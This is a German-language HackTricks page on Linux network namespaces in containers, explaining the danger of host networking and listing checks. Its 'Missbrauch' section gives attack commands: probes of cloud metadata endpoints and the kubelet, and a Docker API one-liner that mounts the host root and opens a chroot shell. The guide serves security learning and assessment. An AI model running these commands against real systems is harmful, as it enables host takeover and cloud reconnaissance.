# Netzwerk-Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Überblick

Der Netzwerk-Namespace isoliert netzwerkbezogene Ressourcen wie Interfaces, IP-Adressen, Routing-Tabellen, ARP/neighbor-Zustand, Firewall-Regeln, Sockets und den Inhalt von Dateien wie `/proc/net`. Deshalb kann ein Container etwas haben, das wie ein eigenes `eth0`, eigene lokale Routen und ein eigenes Loopback-Gerät aussieht, ohne den echten Netzwerk-Stack des Hosts zu besitzen.

Sicherheitsseitig ist das wichtig, weil Netzwerk-Isolation weit mehr bedeutet als nur Port-Binding. Ein privater Network-Namespace begrenzt, was die Workload direkt beobachten oder neu konfigurieren kann. Wird dieser Namespace jedoch mit dem Host geteilt, kann der Container plötzlich Einblick in Host-Listener, host-local Services und Netzwerkkontrollpunkte erhalten, die nie für die Anwendung freigegeben werden sollten.

## Funktionsweise

Ein frisch erstellter Network-Namespace startet mit einer leeren oder nahezu leeren Netzwerkumgebung, bis Interfaces daran angehängt werden. Container-Runtimes erstellen oder verbinden dann virtuelle Interfaces, weisen Adressen zu und konfigurieren Routen, damit die Workload die erwartete Konnektivität erhält. In bridge-basierten Deployments bedeutet das in der Regel, dass der Container ein veth-backed Interface sieht, das mit einer Host-Bridge verbunden ist. In Kubernetes übernehmen CNI-Plugins die entsprechende Einrichtung für Pod-Networking.

Diese Architektur erklärt, warum `--network=host` oder `hostNetwork: true` eine so drastische Änderung darstellt. Anstatt einen vorbereiteten privaten Netzwerk-Stack zu erhalten, schließt sich die Workload dem tatsächlichen Netzwerk-Stack des Hosts an.

## Lab

Sie können ein nahezu leeres Network-Namespace sehen mit:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Und du kannst normale Container und Container mit Host-Netzwerk vergleichen mit:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Der host‑verknüpfte Container hat nicht mehr seine eigene isolierte Socket‑ und Schnittstellenansicht. Diese Änderung allein ist bereits bedeutsam, noch bevor man fragt, welche capabilities der Prozess besitzt.

## Zur Laufzeit

Docker und Podman erstellen normalerweise einen privaten Netzwerk‑Namespace für jeden Container, sofern nicht anders konfiguriert. Kubernetes gibt in der Regel jedem Pod seinen eigenen Netzwerk‑Namespace, der von den Containern innerhalb dieses Pods geteilt wird, aber vom Host getrennt ist. Incus/LXC‑Systeme bieten ebenfalls umfangreiche Isolation auf Basis von Netzwerk‑Namespaces, oft mit einer größeren Vielfalt an virtuellen Netzwerk‑Setups.

Das gemeinsame Prinzip ist, dass private Netzwerkisolation die Standard‑Isolationsgrenze ist, während Host‑Networking eine explizite Abmeldung von dieser Grenze darstellt.

## Fehlkonfigurationen

Die wichtigste Fehlkonfiguration ist schlicht das Teilen des Host‑Netzwerk‑Namespaces. Das wird manchmal aus Performance‑Gründen, für Low‑Level‑Monitoring oder aus Bequemlichkeit gemacht, entfernt aber eine der saubersten Grenzen, die Containern zur Verfügung stehen. Auf dem Host gebundene Listener werden direkter erreichbar, nur auf localhost erreichbare Dienste können zugänglich werden, und Capabilities wie `CAP_NET_ADMIN` oder `CAP_NET_RAW` werden viel gefährlicher, weil die von ihnen erlaubten Operationen nun auf die Netzwerkumgebung des Hosts angewendet werden.

Ein weiteres Problem ist das Übergeben von zu vielen netzwerkbezogenen capabilities, selbst wenn der Netzwerk‑Namespace privat ist. Ein privater Namespace hilft zwar, macht aber raw sockets oder erweiterten Netzwerk‑Kontrollzugriff nicht harmlos.

## Missbrauch

In schwach isolierten Setups können Angreifer Host‑Listener untersuchen, Management‑Endpunkte erreichen, die nur an Loopback gebunden sind, Traffic abhören oder stören — je nach vorhandenen capabilities und Umgebung — oder Routing‑ und Firewall‑Zustände neu konfigurieren, wenn `CAP_NET_ADMIN` vorhanden ist. In einem Cluster kann das auch laterale Bewegung und Control‑Plane‑Aufklärung erleichtern.

Wenn Sie Host‑Networking vermuten, beginnen Sie damit zu prüfen, ob die sichtbaren Interfaces und Listener dem Host gehören und nicht einem isolierten Container‑Netzwerk:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Nur über Loopback erreichbare Dienste sind oft die erste interessante Entdeckung:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Wenn network capabilities vorhanden sind, teste, ob der Workload den sichtbaren Stack inspizieren oder verändern kann:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
In Cluster- oder Cloud-Umgebungen rechtfertigt Host-Netzwerk auch schnelles lokales recon von Metadaten- und Control-Plane-nahen Diensten:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Vollständiges Beispiel: Host-Netzwerk + lokale Runtime / Kubelet-Zugriff

Host-Netzwerk gewährt nicht automatisch root auf dem Host, macht aber oft Dienste zugänglich, die absichtlich nur vom Node selbst erreichbar sein sollen. Wenn einer dieser Dienste schwach geschützt ist, wird Host-Netzwerk zu einem direkten privilege-escalation-Pfad.

Docker API auf localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet auf localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Auswirkungen:

- direkte Kompromittierung des Hosts, wenn eine lokale Runtime-API ohne ausreichenden Schutz exponiert ist
- Cluster-Aufklärung oder laterale Bewegung, wenn kubelet oder lokale Agenten erreichbar sind
- Verkehrsmanipulation oder denial of service, bei Kombination mit `CAP_NET_ADMIN`

## Checks

Ziel dieser Checks ist es herauszufinden, ob der Prozess einen privaten Netzwerk-Stack hat, welche Routen und Listener sichtbar sind und ob die Netzwerkansicht bereits host-ähnlich aussieht, bevor Sie überhaupt die capabilities testen.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
- Wenn die Namespace-Kennung oder das sichtbare Interface-Set wie das Host-System aussieht, könnte host networking bereits verwendet werden.
- `ss -lntup` ist besonders wertvoll, weil es loopback-only listeners und lokale Management-Endpunkte offenlegt.
- Routen, Interface-Namen und der Firewall-Kontext werden viel wichtiger, wenn `CAP_NET_ADMIN` oder `CAP_NET_RAW` vorhanden sind.

Beim Überprüfen eines Containers sollte das network namespace immer zusammen mit dem capability set bewertet werden. Host networking plus starke Netzwerk-Capabilities ist eine völlig andere Ausgangslage als bridge networking plus ein schmales default capability set.
{{#include ../../../../../banners/hacktricks-training.md}}
